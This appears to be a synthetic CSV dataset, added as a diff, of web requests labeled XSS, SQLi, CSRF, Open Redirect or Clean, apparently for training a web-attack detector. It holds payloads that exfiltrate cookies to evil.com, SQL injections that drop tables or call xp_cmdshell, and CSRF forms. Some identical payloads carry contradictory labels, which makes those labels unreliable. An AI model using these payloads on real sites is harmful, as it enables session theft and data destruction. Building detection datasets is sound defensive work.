+"""><img src=x onerror=alert(1)>",299,200,True,False,132,XSS
+<img src='http://target.com/delete?id=1'>,87,302,False,False,126,CSRF
+GET /api/v1/status HTTP/1.1,233,500,True,False,470,Clean
+?target=//evil.com/fake-login,135,302,False,False,20,Open Redirect
+<body background=javascript:alert(1)>,118,200,False,True,179,XSS
+"'""><script>alert(document.cookie)</script>",115,200,True,False,146,XSS
+<a href=javascript:alert(1)>click</a>,564,500,False,False,82,Clean
+"'; INSERT INTO users VALUES ('hacker','hacked') --",597,200,False,True,623,SQLi
+POST /api/update-profile no-csrf-token,87,200,False,False,92,CSRF
+<script>new Image().src='http://evil.com?c='+document.cookie</script>,215,200,True,False,112,XSS
+?target=//evil.com/fake-login,142,301,False,False,98,Open Redirect
+' OR 'x'='x,454,500,False,True,343,SQLi
+<script>eval(atob('YWxlcnQoMSk='))</script>,207,200,True,False,182,XSS
+<object data=javascript:alert(1)>,244,200,True,False,115,XSS
+<script>new Image().src='http://evil.com?c='+document.cookie</script>,111,200,True,False,92,XSS
+1' ORDER BY 3 --,457,500,False,True,702,SQLi
+'; WAITFOR DELAY '0:0:5' --,483,200,False,True,250,SQLi
+GET /api/products HTTP/1.1,111,200,False,False,7,Clean
+<div style=background:url(javascript:alert(1))>,138,200,True,False,69,XSS
+'-alert(1)-',114,200,True,False,295,XSS
+<marquee onstart=alert(1)>,590,200,False,False,209,Clean
+1 AND 1=1,572,200,False,False,725,SQLi
+<iframe src='http://target.com/api/transfer?amount=500'>,131,200,True,False,69,CSRF
+auto-submit form without CSRF token,196,200,False,False,130,CSRF
+<iframe src=javascript:alert(1)>,116,200,True,False,81,XSS
+<body onload=alert('XSS')>,298,200,True,False,53,XSS
+' OR 1=1 --,360,500,False,True,378,SQLi
+SELECT * FROM products WHERE id = ?,76,201,False,False,44,Clean
+1' ORDER BY 3 --,386,200,False,True,438,SQLi
+?forward=http://evil.com,181,301,False,False,23,Open Redirect
+' UNION SELECT table_name FROM information_schema.tables --,250,200,False,True,610,SQLi
+' OR 1=1 --,244,403,True,True,295,SQLi
+<script>new Image().src='http://evil.com?c='+document.cookie</script>,252,200,True,False,131,XSS
+<table background=javascript:alert(1)>,180,200,True,False,245,XSS
+username=john&password=pass123,117,200,False,False,17,Clean
+<img src='http://target.com/delete?id=1'>,121,302,False,False,43,CSRF
+?return_to=http://attacker.com,111,301,False,False,44,Open Redirect
+<link rel=stylesheet href=javascript:alert(1)>,292,200,True,False,74,XSS
+POST /admin/create-user from external origin,117,403,False,False,28,CSRF
+<script>eval(atob('YWxlcnQoMSk='))</script>,97,500,True,True,369,Clean
+Content-Type: application/json,156,201,False,False,22,Clean
+"' AND 1=2 UNION SELECT 1,2,3 --",430,200,False,True,254,SQLi
+<div style=background:url(javascript:alert(1))>,153,200,False,False,180,XSS
+?goto=http://malicious.com,57,302,True,False,16,Open Redirect
+"'; INSERT INTO users VALUES ('hacker','hacked') --",349,500,False,True,344,SQLi
+'; DROP TABLE users; --,261,403,False,False,262,SQLi
+<link rel=stylesheet href=javascript:alert(1)>,200,200,True,False,109,XSS
+<iframe src=javascript:alert(1)>,233,301,False,False,129,XSS
+?redir=http://evil.com,95,301,False,False,8,Open Redirect
+?url=http://phishing.com,231,301,False,True,281,Clean
+or 1=1,584,500,False,True,346,SQLi
+or 1=1,488,500,False,True,360,SQLi
+?url=http://phishing.com,70,302,True,False,84,Open Redirect
+admin'--,307,200,False,True,690,SQLi
+<img src=x onerror=alert(1)>,253,200,True,False,117,XSS
+GET /home HTTP/1.1,139,200,False,False,61,Clean
+"PUT /api/user/profile {name, bio}",57,200,False,False,58,Clean
+Content-Type: application/json,139,200,False,False,5,Clean
+?redirect=//evil.com,100,302,True,False,27,Open Redirect
+?callback=http://attacker.com,197,301,False,False,53,Open Redirect
+?url=http://phishing.com,84,302,True,True,50,Open Redirect
+email=user@example.com,581,301,False,True,161,Clean
+' GROUP BY columnnames HAVING 1=1 --,334,403,False,True,317,SQLi
+' GROUP BY columnnames HAVING 1=1 --,302,500,False,False,579,Clean
+') OR ('1'='1,295,403,False,True,579,SQLi
+Content-Type: application/json,92,200,False,False,2,Clean
+"' AND ascii(substring(username,1,1)) > 64 --",285,500,False,True,778,SQLi
+' OR 'x'='x,330,403,False,True,342,SQLi
+?redirect_uri=http://evil.com,118,302,False,False,12,Open Redirect
+' OR 1=1 LIMIT 1 --,366,200,False,True,415,SQLi
+?redir=http://evil.com,142,403,True,False,194,Clean
+?next=http://evil.com,186,302,False,False,55,Open Redirect
+DELETE /api/cart/item/42,145,200,False,False,0,Clean
+<a href='http://target.com/logout'>click</a>,152,200,False,False,130,CSRF
+<script>document.location='http://evil.com?c='+document.cookie</script>,263,200,True,False,103,XSS
+"fetch('/api/user/delete', {method:'POST'})",162,200,False,False,587,Clean
+<script>alert(1)</script>,121,200,True,False,200,XSS
+' OR '1'='1,513,500,False,True,753,SQLi
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9,132,200,False,False,63,Clean
+<iframe src='http://target.com/api/transfer?amount=500'>,87,403,True,False,10,CSRF
+<script>fetch('http://evil.com?c='+btoa(document.cookie))</script>,236,200,True,False,101,XSS
+<body onload=alert('XSS')>,128,200,True,False,104,XSS
+1 AND 1=1,374,200,False,True,296,SQLi
+?return_to=http://attacker.com,507,200,True,False,359,Clean
+<script>eval(atob('YWxlcnQoMSk='))</script>,202,301,True,False,111,XSS
+cross-origin POST request no SameSite cookie,175,302,False,False,111,CSRF
+?continue=//evil.com/steal,309,200,True,True,210,Clean
+username=john&password=pass123,164,200,False,False,21,Clean
+"POST /api/login {email, password}",133,201,False,False,56,Clean
+1' ORDER BY 3 --,315,500,True,True,281,SQLi
+admin'--,307,500,False,True,114,Clean
+"PUT /api/user/profile {name, bio}",57,200,False,False,7,Clean
+?return_to=http://attacker.com,111,302,False,True,26,Open Redirect
+?dest=http://attacker.com/phish,455,301,False,False,4,Clean
+search=laptop,148,200,False,False,61,Clean
+?forward=http://evil.com,242,301,False,True,151,Clean
+1 AND 1=1,342,500,True,True,590,SQLi
+page=2&limit=10,93,200,False,False,77,Clean
+'; DROP TABLE users; --,262,500,False,True,421,SQLi
+?callback=http://attacker.com,90,302,False,False,27,Open Redirect
+search=laptop,102,200,False,False,70,Clean
+page=2&limit=10,133,200,False,False,20,Clean
+' OR pg_sleep(5) --,338,500,False,True,381,SQLi
+<img src=x onerror=alert(1)>,103,200,True,False,203,XSS
+?return_to=http://attacker.com,90,302,True,False,53,Open Redirect
+"' UNION SELECT null, username, password FROM users --",264,200,False,True,274,SQLi
+XMLHttpRequest POST /api/password/change,184,403,False,False,84,CSRF
+"fetch('/api/user/delete', {method:'POST'})",220,403,False,False,91,CSRF
+1' ORDER BY 3 --,240,500,False,True,355,SQLi
+"' UNION SELECT null, username, password FROM users --",213,200,True,True,246,SQLi
+' OR '1'='1,378,500,False,True,313,SQLi
+<form method=POST action=/api/change-email>,239,200,False,False,142,CSRF
+<img src='http://target.com/delete?id=1'>,589,200,True,False,136,Clean
+<details open ontoggle=alert(1)>,271,200,True,False,191,XSS
+GET /dashboard HTTP/1.1,104,200,False,False,27,Clean
+Content-Type: application/json,168,200,False,False,8,Clean
+1; SELECT * FROM information_schema.tables,321,500,True,True,288,SQLi
+DELETE /api/cart/item/42,95,200,False,False,53,Clean
+' OR pg_sleep(5) --,389,500,False,True,640,SQLi
+<iframe src='http://target.com/api/transfer?amount=500'>,231,200,True,False,124,CSRF
+"'""><script>alert(document.cookie)</script>",156,200,True,False,183,XSS
+"'""><script>alert(document.cookie)</script>",172,200,True,False,237,XSS
+GET /api/products HTTP/1.1,106,200,False,False,16,Clean
+?redirect_uri=http://evil.com,92,301,False,False,74,Open Redirect
+"POST /api/login {email, password}",151,204,False,False,14,Clean
+email=user@example.com,54,200,False,False,63,Clean
+<div style=background:url(javascript:alert(1))>,272,200,True,False,212,XSS
+<link rel=stylesheet href=javascript:alert(1)>,247,200,True,False,275,XSS
+"<script>fetch('/api/delete',{method:'POST',credentials:'include'})</script>",236,200,False,False,39,CSRF
+' OR 1=1 --,579,200,False,False,312,SQLi
+"PUT /api/user/profile {name, bio}",98,204,False,False,5,Clean
+'; DROP TABLE users; --,153,403,True,True,370,Clean
+?continue=//evil.com/steal,55,200,False,False,41,Open Redirect
+POST /admin/create-user from external origin,201,200,False,False,61,CSRF
+'; WAITFOR DELAY '0:0:5' --,214,500,False,True,374,SQLi
+"' AND ascii(substring(username,1,1)) > 64 --",406,500,False,False,570,SQLi
+email=user@example.com,73,200,False,False,65,Clean
+<script>fetch('http://evil.com?c='+btoa(document.cookie))</script>,187,403,False,True,354,Clean
+page=2&limit=10,106,200,False,False,78,Clean
+<table background=javascript:alert(1)>,208,200,True,False,287,XSS
+<form method=POST action=/api/change-email>,214,302,False,False,87,CSRF
+<script>alert(1)</script>,148,301,True,False,80,XSS
+' OR pg_sleep(5) --,547,500,False,True,206,SQLi
+' OR 1=1 LIMIT 1 --,527,500,False,True,560,SQLi
+search=laptop,78,204,False,False,73,Clean
+Content-Type: application/json,95,200,False,False,40,Clean
+"' AND substring(username,1,1)='a",558,500,True,True,218,SQLi
+cross-site request with session cookie,124,200,False,False,578,Clean
+'; WAITFOR DELAY '0:0:5' --,558,200,True,True,585,SQLi
+GET /api/v1/status HTTP/1.1,62,204,False,False,44,Clean
+<body onload=alert('XSS')>,248,200,True,False,63,XSS
+<marquee onstart=alert(1)>,168,200,True,False,166,XSS
+<form action='http://target.com/transfer' method='POST'>,144,302,False,False,106,CSRF
+'; WAITFOR DELAY '0:0:5' --,400,500,False,True,283,SQLi
+1; SELECT * FROM information_schema.tables,485,500,False,True,364,SQLi
+<svg onload=alert(1)>,104,200,False,False,65,XSS
+auto-submit form without CSRF token,158,200,False,False,96,CSRF
+<body background=javascript:alert(1)>,221,200,True,False,222,XSS
+<form action='http://target.com/transfer' method='POST'>,245,403,False,False,30,CSRF
+' OR '1'='1,504,500,True,True,226,Clean
+"' AND 1=2 UNION SELECT 1,2,3 --",492,500,False,True,760,SQLi
+POST /transfer amount=1000&to=attacker,161,302,False,False,135,CSRF
+GET /api/v1/status HTTP/1.1,153,200,False,False,28,Clean
+"PUT /api/user/profile {name, bio}",77,200,False,False,24,Clean
+' OR 1=1 LIMIT 1 --,557,500,True,True,176,Clean
+<video src=x onerror=alert(1)>,113,200,True,True,250,XSS
+<input onfocus=alert(1) autofocus>,405,200,False,True,104,Clean
+DELETE /api/cart/item/42,94,200,False,True,54,Clean
+"'""><script>alert(document.cookie)</script>",511,200,False,True,307,Clean
+GET /api/v1/status HTTP/1.1,114,200,False,False,75,Clean
+GET /api/v1/status HTTP/1.1,138,200,False,False,60,Clean
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9,153,200,False,False,48,Clean
+<a href=javascript:alert(1)>click</a>,267,200,True,False,179,XSS
+?location=http://attacker.com,479,301,False,False,282,Clean
+?location=http://attacker.com,99,302,True,False,14,Open Redirect
+<script>window.location='http://evil.com'</script>,145,200,True,True,259,XSS
+cross-origin POST request no SameSite cookie,238,200,True,False,748,Clean
+form submit missing X-CSRF-Token header,167,302,False,False,13,CSRF
+XMLHttpRequest POST /api/password/change,81,200,False,False,114,CSRF
+1 AND 1=1,280,200,False,True,224,SQLi
+<details open ontoggle=alert(1)>,136,200,True,False,199,XSS
+search=laptop,130,200,False,False,69,Clean
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9,123,204,False,False,65,Clean
+<table background=javascript:alert(1)>,286,200,False,False,240,XSS
+<script>document.location='http://evil.com?c='+document.cookie</script>,174,200,True,False,220,XSS
+"POST /api/login {email, password}",117,200,False,False,58,Clean
+<script>window.location='http://evil.com'</script>,278,200,True,False,183,XSS
+search=laptop,128,200,False,False,74,Clean
+POST /api/update-profile no-csrf-token,113,302,False,False,117,CSRF
+' OR pg_sleep(5) --,325,200,False,True,5,Clean
+<script>document.location='http://evil.com?c='+document.cookie</script>,185,200,True,True,66,XSS
+<script>document.location='http://evil.com?c='+document.cookie</script>,111,301,True,False,63,XSS
+GET /dashboard HTTP/1.1,65,201,False,False,78,Clean
+username=john&password=pass123,104,200,False,False,76,Clean
+<details open ontoggle=alert(1)>,110,200,True,False,129,XSS
+<img src=x onerror=alert(1)>,113,200,True,False,56,XSS
+<img src=1 onerror=this.src='http://evil.com?'+document.cookie>,136,200,True,False,182,XSS
+<script>eval(atob('YWxlcnQoMSk='))</script>,202,200,True,False,239,XSS
+<iframe src='http://target.com/api/transfer?amount=500'>,63,301,True,False,374,Clean
+email=user@example.com,52,201,False,False,58,Clean
+cross-site request with session cookie,217,200,False,False,140,CSRF
+<link rel=stylesheet href=javascript:alert(1)>,253,200,True,False,239,XSS
+?continue=//evil.com/steal,61,302,False,False,43,Open Redirect
+GET /api/v1/status HTTP/1.1,166,200,False,False,53,Clean
+Content-Type: application/json,205,301,False,True,139,Clean
+<div style=background:url(javascript:alert(1))>,257,301,False,False,185,Clean
+' OR 'x'='x,500,500,False,False,118,Clean
+page=2&limit=10,165,200,False,False,47,Clean
+email=user@example.com,174,200,False,False,78,Clean
+SELECT * FROM products WHERE id = ?,108,204,False,False,61,Clean
+"PUT /api/user/profile {name, bio}",151,200,False,False,20,Clean
+?redirect_uri=http://evil.com,185,301,False,True,46,Open Redirect
+form submit missing X-CSRF-Token header,520,301,True,True,510,Clean
+?url=http://phishing.com,134,302,False,False,86,Open Redirect
+'; EXEC xp_cmdshell('dir') --,451,500,True,True,606,SQLi
+<script>window.location='http://evil.com'</script>,133,301,True,False,98,XSS
+' AND SLEEP(5) --,421,200,False,False,254,SQLi
+?location=http://attacker.com,96,302,False,False,32,Open Redirect
+'; EXEC xp_cmdshell('dir') --,470,500,False,True,749,SQLi
+?next=//attacker.com,53,302,False,False,46,Open Redirect
+' GROUP BY columnnames HAVING 1=1 --,442,500,True,True,428,SQLi
+GET /api/v1/status HTTP/1.1,105,200,False,False,30,Clean
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9,66,200,False,False,3,Clean
+"' AND 1=2 UNION SELECT 1,2,3 --",279,500,False,True,148,Clean
+<form action='http://target.com/transfer' method='POST'>,260,200,True,True,491,Clean
+' GROUP BY columnnames HAVING 1=1 --,416,500,True,True,336,SQLi
+?return_to=http://attacker.com,84,301,True,False,12,Open Redirect
+'-alert(1)-',140,200,True,False,61,XSS
+?target=//evil.com/fake-login,146,302,False,False,85,Open Redirect
+SELECT * FROM products WHERE id = ?,87,200,False,False,15,Clean
+<form action='http://target.com/transfer' method='POST'>,189,200,False,False,81,CSRF
+?redir=http://evil.com,61,301,False,False,27,Open Redirect
+GET /api/v1/status HTTP/1.1,93,200,True,False,45,Clean
+<input onfocus=alert(1) autofocus>,152,200,True,False,275,XSS
+<script>window.location='http://evil.com'</script>,103,301,True,False,128,XSS
+<link rel=stylesheet href=javascript:alert(1)>,115,200,True,False,169,XSS
+SELECT * FROM products WHERE id = ?,53,200,False,False,26,Clean
+<script>window.location='http://evil.com'</script>,213,200,True,False,268,XSS
+"' AND 1=2 UNION SELECT 1,2,3 --",271,500,True,True,609,SQLi
+GET /dashboard HTTP/1.1,124,201,False,False,39,Clean
+'; EXEC xp_cmdshell('dir') --,76,500,True,False,272,Clean
+GET /dashboard HTTP/1.1,51,200,False,False,10,Clean
+?redirect=//evil.com,154,302,False,False,82,Open Redirect
+Content-Type: application/json,154,200,False,True,41,Clean
+' OR 1=1 LIMIT 1 --,579,403,False,True,512,SQLi
+?return=http://phishing.com,173,301,False,False,55,Open Redirect
+XMLHttpRequest POST /api/password/change,228,200,True,False,143,CSRF
+?url=http://phishing.com,65,301,True,False,8,Open Redirect
+'; WAITFOR DELAY '0:0:5' --,528,500,False,True,427,SQLi
+') OR ('1'='1,258,500,False,True,430,SQLi
+<script>alert(1)</script>,239,200,True,False,210,XSS
+' AND SLEEP(5) --,234,500,False,True,517,SQLi
+'; DROP TABLE users; --,221,500,False,True,647,SQLi
+filter=price_asc&category=books,85,200,False,False,47,Clean
+<iframe src=javascript:alert(1)>,208,200,True,False,55,XSS
+"<script>fetch('/api/delete',{method:'POST',credentials:'include'})</script>",198,302,False,False,98,CSRF
+"'""><script>alert(document.cookie)</script>",251,200,False,False,141,XSS
+<object data=javascript:alert(1)>,197,200,False,False,276,XSS
+<form method=POST action=/api/change-email>,121,403,False,False,60,CSRF
+DELETE /api/cart/item/42,101,200,False,False,28,Clean
+"""><img src=x onerror=alert(1)>",219,200,True,False,279,XSS
+?url=http://phishing.com,108,302,False,False,53,Open Redirect
+auto-submit form without CSRF token,92,302,False,True,119,CSRF
+' UNION SELECT table_name FROM information_schema.tables --,456,500,False,True,628,SQLi
+1 AND 1=1,463,200,False,True,453,SQLi
+form submit missing X-CSRF-Token header,143,302,False,False,119,CSRF
+username=john&password=pass123,147,200,False,False,59,Clean
+"' UNION SELECT null, username, password FROM users --",415,500,False,True,559,SQLi
+?return=http://phishing.com,161,200,False,True,162,Clean
+?continue=//evil.com/steal,94,302,True,False,57,Open Redirect
+' AND 1=1 --,405,500,False,False,333,SQLi
+' AND 1=1 --,559,403,True,True,222,SQLi
+' OR 1=1#,251,500,False,True,361,SQLi
+or 1=1,254,500,False,True,453,SQLi
+POST /transfer amount=1000&to=attacker,228,200,False,False,50,CSRF
+<body onload=alert('XSS')>,207,200,False,False,263,XSS
+1 AND 1=1,430,403,False,True,529,SQLi
+"""><img src=x onerror=alert(1)>",227,200,True,False,51,XSS
+'; DROP TABLE users; --,515,500,False,True,356,SQLi
+<div style=background:url(javascript:alert(1))>,248,200,True,False,105,XSS
+"PUT /api/user/profile {name, bio}",153,204,False,False,55,Clean
+DELETE /api/cart/item/42,167,200,False,False,12,Clean
+page=2&limit=10,108,200,False,False,52,Clean
+<script>new Image().src='http://evil.com?c='+document.cookie</script>,132,200,True,False,185,XSS
+filter=price_asc&category=books,126,200,False,False,78,Clean
+<img src=x onerror=alert(1)>,185,200,True,False,207,XSS
+GET /home HTTP/1.1,147,200,False,False,78,Clean
+<img src='http://target.com/delete?id=1'>,218,302,False,False,44,CSRF
+POST /api/update-profile no-csrf-token,212,302,False,False,107,CSRF
+'; DROP TABLE users; --,78,200,True,True,600,Clean
+<video src=x onerror=alert(1)>,229,200,True,True,69,XSS
+<img src=x onerror=alert(1)>,119,200,True,False,294,XSS
+' OR pg_sleep(5) --,436,500,False,True,377,SQLi
+?next=//attacker.com,76,301,True,False,98,Open Redirect
+GET /api/v1/status HTTP/1.1,92,200,False,False,69,Clean
+<img src='http://target.com/delete?id=1'>,92,403,False,False,34,CSRF
+GET /dashboard HTTP/1.1,99,200,False,False,79,Clean
+<img src='http://target.com/delete?id=1'>,160,200,False,False,72,CSRF
+"' AND ascii(substring(username,1,1)) > 64 --",508,500,True,False,725,Clean
+admin'--,526,500,False,True,409,SQLi
+?continue=//evil.com/steal,105,301,False,False,30,Open Redirect
+<script>fetch('http://evil.com?c='+btoa(document.cookie))</script>,138,200,True,False,198,XSS
+' OR '1'='1,548,200,True,True,204,SQLi
+<script>new Image().src='http://evil.com?c='+document.cookie</script>,68,200,False,True,446,Clean
+?redirect=//evil.com,148,302,False,True,12,Open Redirect
+admin'--,469,500,False,True,250,SQLi
+<iframe src=javascript:alert(1)>,236,200,True,False,293,XSS
+' AND SLEEP(5) --,387,200,False,True,356,SQLi
+<script>alert(1)</script>,550,200,True,False,675,Clean
+?redir=http://evil.com,113,301,False,False,81,Open Redirect
+cross-site request with session cookie,209,302,False,False,148,CSRF
+cross-origin POST request no SameSite cookie,96,200,False,False,100,CSRF
+"""><img src=x onerror=alert(1)>",275,200,True,False,173,XSS
+' OR 'x'='x,537,500,True,True,766,SQLi
+<script>fetch('http://evil.com?c='+btoa(document.cookie))</script>,217,200,True,False,250,XSS
+?goto=http://malicious.com,133,301,False,False,99,Open Redirect
+<script>new Image().src='http://evil.com?c='+document.cookie</script>,242,200,True,False,122,XSS
+<img src=x onerror=alert(1)>,215,200,True,True,57,Clean
+"""><img src=x onerror=alert(1)>",265,200,True,False,288,XSS
+' UNION SELECT table_name FROM information_schema.tables --,299,500,False,True,621,SQLi
+'-alert(1)-',207,200,True,False,109,XSS
+SELECT * FROM products WHERE id = ?,98,200,False,False,79,Clean
+<div style=background:url(javascript:alert(1))>,282,200,True,False,111,XSS
+<table background=javascript:alert(1)>,150,200,True,False,243,XSS
+' OR 'x'='x,212,500,False,True,642,SQLi
+"PUT /api/user/profile {name, bio}",487,200,False,False,182,Clean
+GET /api/products HTTP/1.1,153,201,False,False,3,Clean
+cross-origin POST request no SameSite cookie,147,302,False,False,39,CSRF
+username=john&password=pass123,256,500,True,False,555,Clean
+?goto=http://malicious.com,162,302,False,False,33,Open Redirect
+<marquee onstart=alert(1)>,116,200,True,False,91,XSS
+?forward=http://evil.com,190,302,True,False,1,Open Redirect
+?url=http://phishing.com,191,302,False,False,81,Open Redirect
+filter=price_asc&category=books,110,200,False,False,60,Clean
+' AND 1=1 --,424,500,False,False,284,SQLi
+<details open ontoggle=alert(1)>,256,200,True,False,227,Clean
+GET /api/v1/status HTTP/1.1,157,200,True,False,43,Clean
+<form action='http://target.com/transfer' method='POST'>,191,200,True,False,80,CSRF
+GET /home HTTP/1.1,133,200,False,False,35,Clean
+?next=//attacker.com,198,200,False,False,50,Open Redirect
+1; SELECT * FROM information_schema.tables,585,500,False,True,491,SQLi
+"<script>fetch('/api/delete',{method:'POST',credentials:'include'})</script>",190,200,False,False,37,CSRF
+?next=http://evil.com,158,302,True,False,70,Open Redirect
+GET /dashboard HTTP/1.1,150,200,False,False,5,Clean
+<svg onload=alert(1)>,126,200,True,False,255,XSS
+"' AND ascii(substring(username,1,1)) > 64 --",493,200,False,True,238,SQLi
+<object data=javascript:alert(1)>,134,200,True,False,195,XSS
+"<script>fetch('/api/delete',{method:'POST',credentials:'include'})</script>",238,403,False,False,109,CSRF
+'; EXEC xp_cmdshell('dir') --,430,500,True,True,675,SQLi
+<img src=x onerror=alert(1)>,214,200,True,False,82,XSS
+' OR 'x'='x,576,500,False,True,580,SQLi
+javascript:alert(1),270,200,True,False,232,XSS
+<a href='http://target.com/logout'>click</a>,219,301,False,False,286,Clean
+POST /admin/create-user from external origin,161,200,False,False,85,CSRF
+<img src='http://target.com/delete?id=1'>,89,302,False,False,87,CSRF
+<marquee onstart=alert(1)>,188,200,True,False,148,XSS
+1' ORDER BY 3 --,449,200,False,False,243,Clean
+<script>document.location='http://evil.com?c='+document.cookie</script>,270,200,True,False,141,XSS
+GET /api/products HTTP/1.1,108,200,False,False,72,Clean
+admin'--,298,200,False,True,526,SQLi
+search=laptop,155,201,False,False,44,Clean
+"1 UNION ALL SELECT NULL,NULL,NULL --",240,500,False,True,316,SQLi
+<link rel=stylesheet href=javascript:alert(1)>,245,200,True,False,165,XSS
+1 AND 1=1,495,500,False,False,545,SQLi
+POST /admin/create-user from external origin,137,200,False,False,47,CSRF
+<iframe src=javascript:alert(1)>,154,200,True,True,59,XSS
+<script>fetch('http://evil.com?c='+btoa(document.cookie))</script>,219,200,True,False,154,XSS
+XMLHttpRequest POST /api/password/change,84,302,False,False,34,CSRF
+"' AND ascii(substring(username,1,1)) > 64 --",334,500,False,True,248,SQLi
+DELETE /api/cart/item/42,149,200,False,False,45,Clean
+' GROUP BY columnnames HAVING 1=1 --,543,200,False,True,303,SQLi
+"POST /api/login {email, password}",124,204,False,False,10,Clean
+"' AND ascii(substring(username,1,1)) > 64 --",253,403,False,True,340,SQLi
+' OR 1=1#,208,500,False,True,674,SQLi
+<script>new Image().src='http://evil.com?c='+document.cookie</script>,153,200,True,False,259,XSS
+<a href='http://target.com/logout'>click</a>,107,200,False,False,56,CSRF
+'; DROP TABLE users; --,500,200,False,True,736,SQLi
